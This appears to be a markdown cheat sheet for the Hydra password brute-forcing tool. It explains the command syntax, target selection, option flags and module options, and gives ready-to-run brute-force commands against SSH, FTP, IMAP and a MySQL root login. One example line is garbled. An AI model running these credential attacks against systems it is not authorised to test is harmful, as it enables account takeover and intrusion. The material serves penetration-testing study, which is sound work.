## Hydra Style

- New Style
  - hydra [some command line options] PROTOCOL://TARGET:PORT/MODULE-OPTIONS
- OLD Style
  - hydra [some command line options] [-s PORT] TARGET PROTOCOL [MODULE-OPTIONS]

- _Syntax BreakDown_
  - hydra ftp://192.168.0.2:2221 -l admin -P list.txt (New)
  - hydra 192.168.0.2 ftp -l admin -P list.txt -s 2221 (Old)

Syntax BreakDown

- _Select Your Target_
  - Single Target : 192.168.0.102
  - A Network Range : 192.168.2.0/24
  - List of Hosts in a Text File
    - 10.10.10.10 || 10.10.10.10:221
- Find A Protocol
- Check For Destination Port : nmap
- Check for Module Options
  - E.g.: http-get
    - A = auth-type
    - H = User Defined header
    - S = Check for Text in HTTP Response

- _Options_
  - l = Single User Name
  - L = List of User Names
  - p = Single User Password
  - P = List of Password
  - V = Show Output on the Screen
  - t = tasks
  - o = Output File
  - m = Module Options

- _Module Syntax_
  - LOGIN, PLAIN, CRAM-MD5, CRAM-SHA1, CRAM-SHA256, DIGEST-MD5, NTLM
  - hydra -l test -p text -m PLAIN 192.168.0.10 imap
  - hydra -l test -p text -m 192.168.0.10PLAIN imap
  - hydra -l test -p test imap://127.0.0.1/PLAIN

```bash
$ hydra ssh://<ip>:<port> -L File.txt -P world.txt -V -f
$ hydra ssh://<ip>:<port> -L File.txt -P world.txt -V -t 2 -f

# MySQL Brute Force
$ hydra mysql://<ip> -l root -P list.txt -o passCrack -V

```
